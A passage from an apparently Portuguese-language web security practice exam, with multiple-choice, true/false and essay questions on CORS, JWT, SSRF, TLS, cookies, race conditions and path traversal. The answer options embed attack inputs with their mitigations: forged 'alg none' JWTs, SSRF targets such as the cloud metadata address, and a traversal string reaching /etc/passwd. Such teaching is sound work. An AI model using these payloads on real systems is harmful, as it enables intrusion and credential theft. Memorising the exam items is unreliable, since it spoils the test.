- **C)** Essa implementação introduz uma vulnerabilidade crítica de **configuração insegura de CORS** que anula na prática a *Same-Origin Policy* (SOP): se uma vítima autenticada visitar `https://site-malicioso.test`, o script do atacante poderá disparar `fetch('https://api.banco-ficticio.test/v1/dados-bancarios', { credentials: 'include' })`; o navegador enviará o cookie de sessão e `Origin: https://site-malicioso.test`, o servidor refletirá essa origem autorizando credenciais, e o navegador entregará os dados sensíveis da vítima diretamente ao JavaScript do atacante (além de a ausência de `Vary: Origin` abrir brecha para envenenamento de cache em CDNs).
- **D)** O único efeito colateral é um aumento de 5 ms no TTFB devido à leitura de `req.headers.origin`, sem risco de vazamento de dados.
- **E)** Essa configuração protege a API contra ataques de *Cross-Site Request Forgery* (CSRF) e *SQL Injection* simultaneamente.

##### Questão 22 (Nível Avançado — Ataques Criptográficos e de Validação em JWT)
A especificação do **JWT** (*JSON Web Token* — RFC 7519) e do **JWS** (*JSON Web Signature* — RFC 7515) exige validações rigorosas no servidor ao verificar um token recebido no cabeçalho `Authorization: Bearer <token>`. Sobre as vulnerabilidades clássicas de implementação de JWT, assinale a alternativa **correta**:

- **A)** No ataque de **algoritmo `none`**, o atacante altera o cabeçalho do JWT para `{"alg": "none", "typ": "JWT"}`, modifica o *payload* (ex.: `"role": "admin"`) e remove a assinatura (mantendo o ponto final: `header.payload.`), explorando bibliotecas mal configuradas que aceitam tokens sem assinatura; já no ataque de **confusão de algoritmo (`RS256` para `HS256`)**, o servidor espera um token assinado assimetricamente com chave privada RSA (`RS256`), mas o atacante altera o cabeçalho para `HS256` (simétrico) e assina o token usando a **chave pública RSA** do servidor (que é pública) como se fosse o segredo HMAC compartilhado, enganando bibliotecas que usam a mesma variável de chave sem restringir a lista de algoritmos permitidos (`algorithms: ['RS256']`).
- **B)** O algoritmo `HS256` é um algoritmo assimétrico baseado em curvas elípticas que utiliza um par de chaves pública e privada, tornando impossível qualquer ataque de força bruta offline mesmo que o segredo tenha apenas 4 caracteres.
- **C)** Para validar um JWT com segurança, basta decodificar o *payload* com `atob()` ou `jwt.decode()` no servidor e verificar se o campo `"exp"` existe, sendo desnecessário verificar a assinatura criptográfica quando a conexão usa HTTPS.
- **D)** O ataque de confusão de algoritmo só ocorre quando o token JWT é armazenado em um cookie com `SameSite=Strict`.
- **E)** Os *claims* registrados `exp` (tempo de expiração), `nbf` (não válido antes de), `iss` (emissor) e `aud` (audiência/destinatário) são validados automaticamente pelo próprio navegador antes de enviar o cabeçalho `Authorization`.

##### Questão 23 (Nível Avançado — Server-Side Request Forgery — SSRF e Metadados de Nuvem)
Uma aplicação corporativa hospedada em nuvem pública possui um endpoint `POST /api/v1/importar-avatar` que recebe um JSON `{"avatarUrl": "https://..."}` e faz com que o servidor back-end busque a imagem remotamente. Para "proteger" o endpoint contra **SSRF** (*Server-Side Request Forgery*), o desenvolvedor implementou o seguinte filtro:

```python
if "localhost" in avatar_url or "127.0.0.1" in avatar_url:
    raise ValueError("URL interna bloqueada!")
resposta = requests.get(avatar_url, allow_redirects=True)
```

Por que essa defesa baseada em *blocklist* textual é facilmente contornável em um teste de intrusão autorizado e qual é a estratégia correta de mitigação?

- **A)** O filtro só falha se o atacante usar o protocolo FTP; para corrigir, basta adicionar `"ftp"` na lista de palavras proibidas.
- **B)** O filtro é 100% eficaz para proteger a nuvem, pois não existem outros endereços IP internos além de `127.0.0.1`.
- **C)** O filtro falha apenas em sistemas operacionais Windows; em servidores Linux o comando `requests.get()` bloqueia automaticamente qualquer IP privado.
- **D)** A *blocklist* textual falha porque um atacante pode: (1) acessar diretamente o serviço de metadados da instância em nuvem no endereço Link-Local **`http://169.254.169.254/latest/meta-data/`** (roubando credenciais temporárias de IAM) ou serviços na rede privada RFC 1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`); (2) usar representações alternativas de loopback (`http://[::1]/`, `http://2130706433/`, `http://127.1/`, `http://0.0.0.0/`); (3) explorar um redirecionamento HTTP (`302 Found`) a partir de um domínio externo legítimo (`allow_redirects=True`); ou (4) usar *DNS Rebinding*. A correção exige *allowlist* estrita de domínios/esquemas, resolução DNS prévia validando que o IP resolvido não pertence a faixas privadas/loopback/link-local, desativação de redirecionamentos automáticos, isolamento de rede e exigência de **IMDSv2** (baseado em token de sessão via `PUT`) na nuvem.
- **E)** Para corrigir o SSRF, basta adicionar o cabeçalho `X-Frame-Options: DENY` na resposta do navegador.

##### Questão 24 (Nível Avançado — HTTP/2, HTTP/3, `Connection ID`, `Transfer Size` vs `Resource Size` e Cache no DevTools)
Ao analisar a aba **Network** do Chrome DevTools com todas as colunas avançadas habilitadas, um engenheiro compara diversas requisições carregadas pela página. Assinale a alternativa tecnicamente **correta** sobre o comportamento de protocolos, conexões, tamanhos e cache no DevTools:

- **A)** Quando a coluna `Protocol` exibe `h2` (HTTP/2), cada arquivo CSS ou JS exige a abertura de uma nova conexão TCP com um `Connection ID` diferente, pois o HTTP/2 não suporta multiplexação.
- **B)** Em `h2` (HTTP/2 sobre TCP) e `h3` (HTTP/3 sobre QUIC/UDP), múltiplas requisições para a mesma origem compartilham um único `Connection ID` graças à multiplexação; porém, o `h3` elimina o *Head-of-Line (HoL) Blocking* na camada de transporte porque a perda de um pacote UDP afeta apenas o fluxo (*stream*) correspondente no QUIC, e não todos os fluxos simultâneos como ocorre na retransmissão TCP do `h2`. Além disso, na coluna `Size`, o valor superior indica o **Transfer Size** (bytes efetivamente trafegados na rede, comprimidos com Brotli/Gzip mais cabeçalhos) e o valor inferior indica o **Resource Size** (tamanho real descomprimido do recurso).
- **C)** Quando a coluna `Size` exibe `(memory cache)` ou `(disk cache)`, significa que o navegador enviou uma requisição condicional com `If-None-Match` pela rede até o servidor e recebeu obrigatoriamente `304 Not Modified` com alto consumo de TTFB.
- **D)** O protocolo `h3` opera sobre a porta TCP `80` sem criptografia, sendo incompatível com o TLS 1.3.
- **E)** O **Transfer Size** é sempre maior que o **Resource Size** quando o servidor utiliza compressão `Content-Encoding: br` (Brotli) em arquivos de texto grandes.

##### Questão 25 (Nível Avançado — Isolamento Cross-Origin (`COOP`, `COEP`, `CORP`) e Prefixos de Cookies `__Host-` e `Partitioned`)
Os navegadores modernos implementam mecanismos avançados de isolamento de processos e endurecimento de cookies contra ataques de canal lateral (*Spectre* / *XS-Leaks*) e falsificação de escopo de cookies. Sobre os cabeçalhos **`COOP`**, **`COEP`**, **`CORP`**, o prefixo **`__Host-`** e o atributo **`Partitioned` (CHIPS)**, assinale a alternativa **correta**:

- **A)** Um cookie com prefixo `__Host-` exige que o atributo `Domain` seja explicitamente definido (ex.: `Domain=.exemplo.test`) e permite o uso de `Path=/admin` em conexões HTTP sem TLS.
- **B)** Para habilitar o estado `window.crossOriginIsolated === true` (necessário para usar `SharedArrayBuffer` e timers de alta precisão), basta configurar `Access-Control-Allow-Origin: *` na página HTML.
- **C)** O cabeçalho `Cross-Origin-Resource-Policy: same-origin` (CORP) tem a mesma função do atributo `HttpOnly` de um cookie, impedindo a leitura de `document.cookie`.
- **D)** O atributo `Partitioned` (CHIPS) faz com que o cookie seja dividido em 4 pedaços iguais e enviado por portas UDP diferentes para acelerar o login.
- **E)** Para que um cookie com o prefixo **`__Host-`** (ex.: `__Host-id=123`) seja aceito pelo navegador, ele deve obrigatoriamente ser definido em uma origem segura (HTTPS), conter a flag `Secure`, possuir `Path=/` e **não** conter o atributo `Domain` (garantindo vínculo exclusivo ao host exato). Já o estado **`window.crossOriginIsolated`** exige o envio conjunto de `Cross-Origin-Opener-Policy: same-origin` (**COOP**) e `Cross-Origin-Embedder-Policy: require-corp` (ou `credentialless`, **COEP**), enquanto o atributo **`Partitioned`** (CHIPS) vincula um cookie de terceiro à chave de partição composta pelo site de nível superior (*top-level site*).

##### Questão 26 (Nível Avançado — Race Conditions / TOCTOU em Operações Financeiras)
Em uma carteira digital, o endpoint `POST /api/v1/resgatar-cupom` executa a seguinte lógica no servidor para aplicar um cupom de R$ 50,00 de uso único:

```python
cupom = db.execute("SELECT usado, valor FROM cupons WHERE codigo = %s", [codigo]).fetchone()
if not cupom.usado:
    db.execute("UPDATE contas SET saldo = saldo + %s WHERE usuario_id = %s", [cupom.valor, user_id])
    db.execute("UPDATE cupons SET usado = TRUE WHERE codigo = %s", [codigo])
    db.commit()
```

Em um teste de segurança autorizado em laboratório, o analista dispara 20 requisições `POST /api/v1/resgatar-cupom` simultaneamente (por exemplo, utilizando multiplexação em pacote único no HTTP/2) e consegue creditar R$ 1.000,00 (20 vezes o valor do cupom). Qual vulnerabilidade foi explorada e como corrigi-la de forma definitiva?

- **A)** Foi explorada uma vulnerabilidade de *Clickjacking*; a correção é adicionar um atraso `time.sleep(5)` entre o `SELECT` e o `UPDATE`.
- **B)** Foi explorada uma vulnerabilidade de **Race Condition** (*Condição de Corrida*) do tipo **TOCTOU** (*Time-of-Check to Time-of-Use*), pois múltiplas *threads*/transações concorrentes executaram a verificação (`SELECT usado` retornando `False`) na janela de tempo antes de a primeira transação gravar `usado = TRUE`. A correção definitiva exige garantir **atomicidade e isolamento** no banco de dados: por exemplo, realizar uma operação atômica única (`UPDATE cupons SET usado = TRUE WHERE codigo = %s AND usado = FALSE RETURNING valor` verificando as linhas afetadas dentro da mesma transação) ou utilizar bloqueio pessimista de linha (`SELECT ... FOR UPDATE`) aliado a restrições de unicidade e chaves de idempotência.
- **C)** Foi explorada uma vulnerabilidade de *Open Redirect*; a correção é validar o cupom no front-end usando `sessionStorage` antes de enviar a requisição.
- **D)** Foi explorada uma falha de *Session Fixation*; a correção é trocar o banco de dados relacional por arquivos `.txt` locais sem controle de concorrência.
- **E)** Trata-se de um erro de CORS; a correção é remover o comando `db.commit()` do código.

##### Questão 27 (Nível Avançado — Path Traversal, Canonicalização e File Upload Vulnerabilities)
Um sistema de chamados técnicos possui duas rotas críticas:
1. `GET /api/anexos/download?arquivo=manual.pdf`, que sanitiza o parâmetro fazendo `nome = req.query.arquivo.replace("../", "")` antes de ler `/var/www/anexos/` + `nome`.
2. `POST /api/anexos/upload`, que verifica apenas se `req.file.mimetype === "image/png"` e salva o arquivo com o nome original enviado pelo usuário (`req.file.originalname`) diretamente dentro da pasta pública `/var/www/html/uploads/` (onde o servidor web interpreta scripts `.php` ou `.jsp`).

Sobre as vulnerabilidades presentes nessas duas rotas e suas correções, assinale a alternativa **correta**:

- **A)** Ambas as rotas estão seguras, pois `replace("../", "")` remove qualquer tentativa de travessia de diretório e o cabeçalho `Content-Type` enviado pelo navegador no upload nunca pode ser alterado pelo usuário.
- **B)** Na rota 1 ocorre *SQL Injection* e na rota 2 ocorre *CSRF*; basta usar HTTPS para corrigir ambas.
- **C)** Na rota 1, o problema só existe em servidores Windows; na rota 2, basta verificar a extensão do arquivo via JavaScript no evento `onchange` do `<input type="file">`.
- **D)** Na rota 1, a substituição simples e não recursiva `replace("../", "")` é vulnerável a **Path Traversal** (CWE-22) usando sequências aninhadas como `....//....//....//etc/passwd` (que após a remoção de `../` se tornam `../../../etc/passwd`) ou codificações URL; a correção exige usar identificadores indiretos (ID no banco) ou canonicalizar o caminho com `path.resolve()` / `fs.realpathSync()` e validar se o caminho final inicia estritamente com o diretório base permitido (`/var/www/anexos/`). Na rota 2, há **File Upload Vulnerability** crítica (permitindo *Web Shell* / RCE, pois o `Content-Type` da requisição é controlado pelo cliente e o nome original pode conter `.php` ou `../`); a correção exige validar *magic bytes* (assinatura binária real), renomear o arquivo com UUID gerado no servidor, armazenar fora do *webroot* (ou em *object storage* isolado), desabilitar execução de scripts no diretório de uploads e servir com `Content-Disposition: attachment` e `X-Content-Type-Options: nosniff`.
- **E)** Para corrigir ambas as rotas, deve-se permitir apenas arquivos `.exe` e salvar os uploads na pasta `/etc/` do servidor Linux.

##### Questão 28 (Nível Avançado — Handshake TLS 1.3 vs TLS 1.2, Forward Secrecy e SNI)
A segurança do protocolo HTTPS moderno apoia-se no **TLS 1.3** (RFC 8446). Comparando o TLS 1.3 com o TLS 1.2 e analisando os conceitos de **Forward Secrecy** (*Sigilo Perfeito de Encaminhamento*), **AEAD** (*Authenticated Encryption with Associated Data*) e **SNI** (*Server Name Indication*), assinale a alternativa **correta**:

- **A)** O TLS 1.3 reduziu o *handshake* completo de **2-RTT** (no TLS 1.2) para apenas **1-RTT** (enviando parâmetros *key share* já no `ClientHello`), removeu algoritmos legados inseguros (como troca de chaves RSA estática, RC4, 3DES, MD5, SHA-1 e modos CBC vulneráveis a *padding oracle*), tornou obrigatório o **Forward Secrecy** via troca de chaves Diffie-Hellman efêmera (**ECDHE** — garantindo que o comprometimento futuro da chave privada do certificado do servidor não permita descriptografar tráfegos passados capturados) e utiliza exclusivamente cifras **AEAD** (como `AES-128-GCM`, `AES-256-GCM` e `ChaCha20-Poly1305`). Já a extensão **SNI** informa o nome do domínio no `ClientHello` para que um servidor com múltiplos sites no mesmo IP entregue o certificado X.509 correto.
- **B)** No TLS 1.3, o *handshake* exige 4 viagens de ida e volta (4-RTT) além do *handshake* TCP, e todas as chaves de sessão são geradas criptografando um número aleatório diretamente com a chave pública RSA estática do certificado do servidor (sem uso de Diffie-Hellman).
- **C)** O **Forward Secrecy** significa que o navegador compartilha a mesma chave simétrica de sessão com todos os sites que o usuário visitar durante o dia para economizar CPU.
- **D)** A extensão **SNI** é enviada apenas pelo servidor no final da conexão (`FIN-ACK`) para encerrar o socket TCP na porta `443`.
- **E)** O TLS 1.3 aboliu o uso de Certificados Digitais X.509 e de Autoridades Certificadoras (CAs), confiando apenas no endereço MAC do servidor.

##### Questão 29 (Nível Avançado — Service Workers, Cache Storage e Persistência Indevida na Aba Application)
Em uma aplicação bancária progressiva (PWA), um desenvolvedor registrou um **Service Worker** (`sw.js`) que intercepta todas as requisições `fetch` e aplica uma estratégia *Cache First* salvando todas as respostas na API **Cache Storage** do navegador. Ao auditar a aplicação em um computador compartilhado de laboratório usando a aba **Application** do Chrome DevTools, que falha grave de segurança você identificará e como investigá-la e corrigi-la?

- **A)** O Service Worker apagará automaticamente os cookies `HttpOnly` a cada 5 segundos; a correção é desinstalar o navegador Chrome.
- **B)** Os Service Workers podem ser registrados em conexões HTTP comuns (`http://`) de qualquer site na Internet e têm acesso direto aos arquivos do sistema operacional (`C:\Windows\System32`).
- **C)** A falha é o **armazenamento persistente de respostas autenticadas e dados financeiros sensíveis no Cache Storage** do cliente: mesmo após o usuário encerrar a sessão (logout), qualquer pessoa que acessar o navegador (ou inspecionar **Application > Storage > Cache Storage**) poderá visualizar o JSON completo de extratos e dados pessoais cacheados pelo Service Worker. No DevTools, investiga-se inspecionando **Application > Service Workers** (testando *Bypass for network* e *Unregister*) e **Cache Storage**; a correção exige **nunca** armazenar endpoints autenticados ou dados sensíveis no Cache Storage (restrito a ativos estáticos públicos como CSS/JS/ícones), respeitar `Cache-Control: no-store` no Service Worker e limpar explicitamente os caches no logout (via `caches.delete()` e header `Clear-Site-Data: "cache", "cookies", "storage"`).
- **D)** O Cache Storage é limpo automaticamente sempre que o servidor envia o código de status `200 OK`, não oferecendo risco em computadores compartilhados.
- **E)** A única função do Service Worker é bloquear ataques de SQL Injection no banco de dados do servidor.

##### Questão 30 (Nível Avançado — Auditoria de APIs: BOLA/IDOR, Mass Assignment e Limitações Caixa-Preta vs Caixa-Branca)
Durante uma auditoria de segurança em uma plataforma de ensino online (`https://ead.exemplo.test`), um analista realiza dois testes na aba **Network** e **Console** do DevTools:
1. Observa a requisição `GET https://ead.exemplo.test/api/v1/boletim?aluno_id=501` e repete a chamada alterando para `aluno_id=502`, recebendo `200 OK` com as notas e o CPF de outro estudante.
2. Observa a requisição de atualização de perfil `PATCH https://ead.exemplo.test/api/v1/usuarios/me` com payload `{"nome": "Carlos", "telefone": "11999990000"}`, adiciona o campo `"perfil": "coordenador"` no corpo JSON (observado previamente na resposta do `GET /usuarios/me`) e passa a ter acesso administrativo.

Quais são, respectivamente, as duas vulnerabilidades confirmadas e o que o analista **não** conseguiria confirmar apenas pelo navegador (exigindo auditoria caixa-branca no servidor)?

- **A)** (1) *Cross-Site Request Forgery* (CSRF) e (2) *Clickjacking*; pelo navegador não é possível saber se o site usa HTTPS ou quais cabeçalhos `Set-Cookie` foram enviados.
- **B)** (1) *Command Injection* e (2) *DNS Poisoning*; pelo navegador não é possível ver o código de status HTTP nem o *payload* JSON das respostas.
- **C)** (1) *Session Fixation* e (2) *Open Redirect*; pelo navegador é possível confirmar com 100% de certeza qual algoritmo de hash de senha (`Argon2id` vs `MD5`) o banco de dados usa internamente mesmo quando a API não retorna hashes.
- **D)** (1) *Directory Traversal* e (2) *Race Condition*; pelo navegador não é possível inspecionar o `localStorage` nem os cookies sem `HttpOnly`.
- **E)** (1) **BOLA / IDOR** (*Broken Object Level Authorization* / *Insecure Direct Object Reference*, pela ausência de verificação no servidor de que o usuário autenticado é o titular do objeto `502`) e (2) **Mass Assignment** (*Atribuição em Massa* / *BOPLA — Broken Object Property Level Authorization*, pelo vínculo direto do JSON de entrada ao modelo do banco sem *allowlist*/DTO de campos editáveis). Por outro lado, apenas pelo navegador (análise *caixa-preta*), o analista **não** consegue auditar controles puramente internos do servidor que não refletem na resposta HTTP, como o algoritmo de *hashing* de senhas no banco (`Argon2id`/`bcrypt` vs `SHA-256` sem salt), a existência de SQL Injection cego em rotinas batch assíncronas internas ou regras de firewall entre sub-redes privadas do *data center*.


---

<a id="s9-2"></a>
### 9.2 Questões de Verdadeiro ou Falso (Questões 31 a 45)

Julgue cada uma das afirmações técnicas a seguir (graduadas do **Nível Básico** ao **Nível Avançado**) como **Verdadeira `(V)`** ou **Falsa `(F)`**. A justificativa detalhada de cada item encontra-se no [Gabarito Comentado (Seção 9.5.5)](#s9-5-5).

##### Questão 31 (Nível Básico — Métodos HTTP, Segurança Semântica e Idempotência)
`( )` De acordo com a RFC 9110 (*HTTP Semantics*), os métodos `GET`, `HEAD` e `OPTIONS` são classificados simultaneamente como **seguros** (*safe* — não devem causar efeitos colaterais de alteração de estado no servidor) e **idempotentes**; o método `PUT` e o método `DELETE` são **idempotentes** (mas não seguros), enquanto o método `POST` **não** é seguro nem idempotente por definição.

##### Questão 32 (Nível Básico — Códigos de Status `401 Unauthorized` vs `403 Forbidden`)
`( )` Quando um usuário já autenticado com sucesso no sistema (portando uma sessão válida com perfil de "Vendedor") tenta acessar a rota administrativa `/api/v1/folha-pagamento` exclusiva do perfil "Diretoria", o servidor deve retornar o código de status HTTP **`401 Unauthorized`**, visto que o usuário não tem autorização para visualizar aquele recurso.

##### Questão 33 (Nível Básico — Escopo de Proteção da Flag `HttpOnly` em Cookies)
`( )` Configurar o atributo `HttpOnly` em um cookie de sessão impede que scripts executados no navegador leiam seu valor através de `document.cookie` (mitigando o roubo direto de sessão via XSS), mas **não** impede, por si só, que o navegador anexe e envie esse cookie automaticamente em requisições forjadas durante um ataque de **CSRF** (*Cross-Site Request Forgery*).

##### Questão 34 (Nível Básico — Escopo de Proteção do Protocolo HTTPS/TLS)
`( )` Se uma aplicação web opera integralmente sobre **HTTPS** com protocolo TLS 1.3 e possui um certificado digital X.509 válido emitido por uma Autoridade Certificadora (CA) confiável, a aplicação torna-se automaticamente imune a ataques de **SQL Injection** e **Cross-Site Scripting (XSS)**, pois todos os pacotes são criptografados em trânsito.

##### Questão 35 (Nível Básico — Persistência e Escopo entre `sessionStorage` e `localStorage`)
`( )` Os dados gravados no `sessionStorage` são compartilhados automaticamente entre todas as abas abertas de mesma origem no navegador e permanecem persistidos no disco rígido por tempo indeterminado, mesmo após o usuário encerrar completamente o processo do navegador.

##### Questão 36 (Nível Intermediário — Codificação Base64URL no Payload do JWT)
`( )` Em um token **JWT** padrão assinado (*JSON Web Signature* — JWS, formato `header.payload.signature`), o cabeçalho e o *payload* são apenas codificados em **Base64URL**, e não criptografados; consequentemente, qualquer pessoa ou script que tenha acesso ao token pode decodificar e ler integralmente todos os seus *claims* sem precisar conhecer a chave secreta ou privada do servidor.

##### Questão 37 (Nível Intermediário — Definição Estrita de Origem na Same-Origin Policy)
`( )` Para a **Same-Origin Policy (SOP)** dos navegadores web, as URLs `https://loja-ficticia.test:443/carrinho` e `http://loja-ficticia.test:80/carrinho` pertencem exatamente à **mesma origem** (*same-origin*), uma vez que compartilham o mesmo nome de domínio registrado (`loja-ficticia.test`) e o mesmo caminho (`/carrinho`).

##### Questão 38 (Nível Intermediário — Interpretação de TTFB e Content Download no DevTools)
`( )` Na aba **Network > Timing** do Chrome DevTools, quando uma requisição apresenta um tempo de **Waiting for server response (TTFB)** muito elevado (por exemplo, `4.200 ms`) acompanhado de um tempo de **Content Download** muito baixo (`2 ms`), conclui-se que a demora ocorreu na geração da resposta pelo servidor back-end (como consultas SQL lentas ou chamadas síncronas bloqueantes) ou na latência de rede até o servidor, e não no volume de bytes transferidos na resposta.

##### Questão 39 (Nível Intermediário — Combinação de `Access-Control-Allow-Origin: *` com Credenciais no CORS)
`( )` Caso um servidor de API configure simultaneamente os cabeçalhos de resposta `Access-Control-Allow-Origin: *` e `Access-Control-Allow-Credentials: true`, o navegador permitirá normalmente que qualquer página externa leia a resposta de chamadas `fetch(url, { credentials: 'include' })` enviando os cookies de sessão do usuário.

##### Questão 40 (Nível Intermediário — Faixas de Endereçamento IPv4 Privado da RFC 1918)
`( )` Os blocos de endereços IPv4 **`10.0.0.0/8`**, **`172.16.0.0/12`** (abrangendo de `172.16.0.0` até `172.31.255.255`) e **`192.168.0.0/16`** são reservados pela **RFC 1918** para redes privadas; pacotes com esses endereços não são roteáveis diretamente na Internet pública sem a tradução de endereços realizada por um dispositivo **NAT** (*Network Address Translation*).

##### Questão 41 (Nível Avançado — Comportamento de `'unsafe-inline'` na Presença de `nonce` no CSP)
`( )` Quando uma política **`Content-Security-Policy`** declara `script-src 'self' 'nonce-K9x2mP8qR4vL' 'unsafe-inline'`, os navegadores modernos compatíveis com CSP Nível 2 e Nível 3 ignoram automaticamente a diretiva `'unsafe-inline'` para blocos de script, autorizando apenas a execução de elementos `<script>` que contenham o atributo `nonce="K9x2mP8qR4vL"` válido (mantendo `'unsafe-inline'` apenas como *fallback* para navegadores muito antigos que só suportavam CSP Nível 1).

##### Questão 42 (Nível Avançado — Cabeçalho `Clear-Site-Data` e Equivalência na Aba Application)
`( )` O envio do cabeçalho HTTP de resposta `Clear-Site-Data: "cache", "cookies", "storage"` pelo servidor no endpoint de encerramento de sessão (`POST /logout`) instrui o navegador a apagar de forma nativa os cookies, o `localStorage`, o `sessionStorage`, o `IndexedDB` e o cache HTTP/Cache Storage associados àquela origem, atuando como o equivalente programático do botão **Clear site data** presente em **Application > Storage** no Chrome DevTools.

##### Questão 43 (Nível Avançado — Requisitos de Processamento do Cabeçalho HSTS segundo a RFC 6797)
`( )` O cabeçalho `Strict-Transport-Security` (HSTS) é aceito e ativado pelo navegador mesmo quando é recebido em uma resposta trafegada sobre uma conexão HTTP não criptografada (`http://`) ou em uma conexão HTTPS cujo certificado digital X.509 apresente erros de validação (como certificado autoassinado ou expirado).

##### Questão 44 (Nível Avançado — Preservação de Método HTTP em Redirecionamentos `301`/`302` vs `307`/`308`)
`( )` Diferentemente dos códigos de redirecionamento históricos `301 Moved Permanently` e `302 Found` (nos quais os navegadores tradicionalmente alteram o método da requisição de `POST` para `GET` e descartam o corpo ao seguir o cabeçalho `Location`), os códigos **`307 Temporary Redirect`** e **`308 Permanent Redirect`** garantem por especificação que o método HTTP original (ex.: `POST`) e o corpo (*payload*) da requisição não sejam alterados quando o cliente repetir a requisição no novo destino.

##### Questão 45 (Nível Avançado — Uso de UDP e TCP na Porta `53` pelo Protocolo DNS)
`( )` O protocolo **DNS** (*Domain Name System*) opera exclusivamente sobre o protocolo de transporte **UDP** na porta `53`, sendo tecnicamente incapaz de estabelecer conexões **TCP** na porta `53`, mesmo durante operações de transferência de zona entre servidores (`AXFR`) ou quando o tamanho da resposta DNS ultrapassa o limite suportado pelo datagrama UDP (flag `TC` — *Truncated*).

---

<a id="s9-3"></a>
### 9.3 Questões Discursivas (Questões 46 a 55)

Responda às questões de **46 a 55** de forma dissertativa, estruturada e tecnicamente aprofundada. Ao final do simulado, compare sua resposta com o [Padrão de Resposta da Banca (Seção 9.5.6)](#s9-5-6).

##### Questão 46 (Discursiva — Arquitetura de Sessão: Cookies `HttpOnly` vs `localStorage` vs `sessionStorage` e JWT)
Uma equipe de engenharia de software está projetando o sistema de autenticação de uma nova aplicação bancária do tipo SPA (*Single-Page Application*) que consome uma API REST. Metade da equipe defende salvar o token **JWT** (*JSON Web Token*) no `localStorage`, enquanto a outra metade defende o uso de cookies gerenciados pelo servidor.
Elabore um parecer técnico completo abordando obrigatoriamente:
1. A diferença de funcionamento, escopo por aba/origem e ciclo de vida entre **`localStorage`** e **`sessionStorage`**.
2. Qual é o risco concreto de armazenar tokens JWT no `localStorage` (ou `sessionStorage`) frente a vulnerabilidades de **XSS** (*Cross-Site Scripting*).
3. O que significa um cookie **sem o atributo `HttpOnly`** e como os atributos **`HttpOnly`**, **`Secure`**, **`SameSite`** (`Strict`, `Lax`, `None`) e o prefixo **`__Host-`** protegem a sessão.
4. Por que cookies estão sujeitos a **CSRF** (*Cross-Site Request Forgery*) e qual combinação arquitetural você recomenda para máxima segurança na aplicação bancária.

##### Questão 47 (Discursiva — Semântica HTTP, Autenticação vs. Autorização e Tratamento Seguro de Erros: `200`, `401`, `403` e `500`)
A correta utilização dos códigos de status HTTP é essencial tanto para a interoperabilidade de APIs REST quanto para a segurança e o monitoramento da aplicação. Explique detalhadamente:
1. O significado técnico dos códigos **`200 OK`**, **`401 Unauthorized`**, **`403 Forbidden`** e **`500 Internal Server Error`**.
2. A diferença conceitual e prática entre **Autenticação** (associada ao `401`) e **Autorização** (associada ao `403`), exemplificando cada caso.
3. Em qual situação específica de segurança um arquiteto pode decidir retornar intencionalmente **`404 Not Found`** em vez de **`403 Forbidden`** quando um usuário autenticado tenta acessar um recurso privado que pertence a outro cliente.
4. Por que constitui uma má prática grave retornar **`200 OK`** com `{ "sucesso": false, "erro": "..." }` em falhas de autenticação/servidor, e qual é o perigo de segurança de retornar detalhes técnicos (*stack traces*) em respostas **`500 Internal Server Error`**.

##### Questão 48 (Discursiva — Same-Origin Policy, CORS e Configuração Segura de `Access-Control-Allow-Origin`)
Muitos incidentes de vazamento de dados em APIs modernas decorrem da incompreensão sobre a relação entre a **Same-Origin Policy (SOP)** e o **CORS** (*Cross-Origin Resource Sharing*). Responda:
1. O que é a **Same-Origin Policy (SOP)**, quais são os três componentes que definem uma origem (`Origin`) e o que a SOP permite versus o que ela bloqueia por padrão.
2. O que significa exatamente o cabeçalho de resposta **`Access-Control-Allow-Origin: *`**, em quais cenários ele é seguro e por que os navegadores bloqueiam sua combinação com `Access-Control-Allow-Credentials: true`.
3. Por que a prática de refletir dinamicamente o cabeçalho `Origin` da requisição no cabeçalho `Access-Control-Allow-Origin` junto com `Access-Control-Allow-Credentials: true` gera uma vulnerabilidade crítica.
4. Como implementar uma validação segura de CORS no back-end e por que é obrigatório incluir o cabeçalho **`Vary: Origin`** quando o servidor permite múltiplas origens a partir de uma *allowlist*.

##### Questão 49 (Discursiva — Defesa em Profundidade contra Cross-Site Scripting — XSS e Função do CSP)
O **Cross-Site Scripting (XSS)** continua sendo uma das vulnerabilidades de maior impacto no ecossistema web. Discorra tecnicamente sobre:
1. O que é o **XSS** e como funcionam suas três variantes: **XSS Refletido** (*Reflected*), **XSS Armazenado** (*Stored*) e **XSS Baseado em DOM** (*DOM-Based*, destacando o conceito de *source* e *sink*).
2. Quais são as defesas primárias no código da aplicação (diferenciando `textContent` de `innerHTML`, codificação contextual de saída — *Output Encoding* — e sanitização com bibliotecas como `DOMPurify`).
3. Qual é a função do cabeçalho **`Content-Security-Policy` (CSP)** na mitigação de XSS, por que políticas baseadas apenas em listas de domínios ou contendo `'unsafe-inline'` e `'unsafe-eval'` costumam falhar, e como estruturar uma política CSP moderna baseada em **`nonce`** criptográfico e **`'strict-dynamic'`**.

##### Questão 50 (Discursiva — Injeção no Servidor: SQL Injection, Command Injection e Path Traversal com Código Seguro)
As vulnerabilidades de **SQL Injection** (CWE-89), **OS Command Injection** (CWE-78) e **Path Traversal** (CWE-22) compartilham um mesmo princípio fundamental de falha: a mistura entre dados controlados pelo usuário e instruções de controle interpretadas pelo sistema.
1. Explique o mecanismo de ocorrência de cada uma dessas três vulnerabilidades no back-end.
2. Para **cada uma das três vulnerabilidades**, escreva um pequeno trecho didático de **código vulnerável** (em JavaScript/Node.js ou Python) e, logo abaixo, reescreva o **código corrigido** utilizando as práticas recomendadas de mercado (*Prepared Statements*, execução de processos sem shell com argumentos em array / bibliotecas nativas e canonicalização de caminhos com verificação de prefixo).

##### Questão 51 (Discursiva — Redes de Computadores: TCP vs. UDP, Three-Way Handshake e Evolução HTTP/1.1, HTTP/2 e HTTP/3)
Analise a pilha de protocolos de transporte e aplicação que sustenta a Web moderna:
1. Compare detalhadamente os protocolos **TCP** e **UDP** quanto a conexão, confiabilidade, ordenação, controle de fluxo/congestionamento, tamanho de cabeçalho e casos de uso.
2. Descreva passo a passo o **Three-Way Handshake** do TCP (explicitando as flags enviadas em cada etapa e a sincronização dos números de sequência `Seq` e confirmação `Ack`), bem como o ataque de **SYN Flood** e a defesa por *SYN Cookies*.
3. Explique como a evolução do **HTTP/1.1** para o **HTTP/2** (`h2`, sobre TCP) e para o **HTTP/3** (`h3`, sobre **QUIC** e UDP) solucionou o problema de **Head-of-Line (HoL) Blocking** e reduziu o número de viagens de ida e volta (*Round-Trip Times* — RTTs) necessárias para iniciar uma conexão segura com TLS 1.3.

##### Questão 52 (Discursiva — Diagnóstico de Performance e Segurança na Aba Network: TTFB, Timing e HTTPS)
